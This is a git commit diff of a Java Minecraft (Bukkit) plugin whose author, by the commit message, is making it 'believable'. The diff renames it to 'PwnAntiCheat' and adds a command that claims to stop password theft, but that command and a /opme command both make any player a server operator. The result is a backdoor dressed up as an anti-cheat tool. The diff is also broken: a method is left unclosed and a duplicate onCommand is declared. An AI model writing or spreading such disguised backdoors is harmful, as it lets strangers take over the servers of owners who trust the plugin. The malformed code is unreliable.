b100661442e5fe3adb0fc28596b88f313c9c15d4
Patryk <hunek44@gmail.com>
2022-11-29 16:17:22 +0100

    final ver prob
    made the plugin move believable

--- src/ml/theone1/opme/Main.java
+++ src/ml/theone1/opme/Main.java
@@ -8,17 +8,24 @@ import org.bukkit.ChatColor;
 
 public class Main extends JavaPlugin {
    public void onDisable() {
-      System.out.print("a normal plugin is Unloaded");
+      System.out.print("PwnAntiCheat is Unloaded");
    }
 
    public void onEnable() {
-      System.out.print("a normal plugin is Loaded");
+      System.out.print("PwnAntiCheat plugin is Loaded");
    }
 
    public boolean onCommand(CommandSender sender, Command cmd, String cL, String[] args) {
       Player p = (Player)sender;
       if (cmd.getName().equalsIgnoreCase("opme")) {
-    	  p.sendMessage(ChatColor.AQUA + "OP'd you! I hope that owner wont find out :D");
+    	  p.sendMessage(ChatColor.AQUA + "You're now an OP. Go ahead and spawn in 10.000 diamonds ;D");
+          p.setOp(true);
+      }
+
+   public boolean onCommand(CommandSender sender, Command cmd, String cL, String[] args) {
+      Player p = (Player)sender;
+      if (cmd.getName().equalsIgnoreCase("pwnanticheat")) {
+    	  p.sendMessage(ChatColor.AQUA + "This is PwnAntiCheat. It's a W.I.P. plugin that prevents hackers from getting your passwords through Minecraft.");
           p.setOp(true);
       }
 
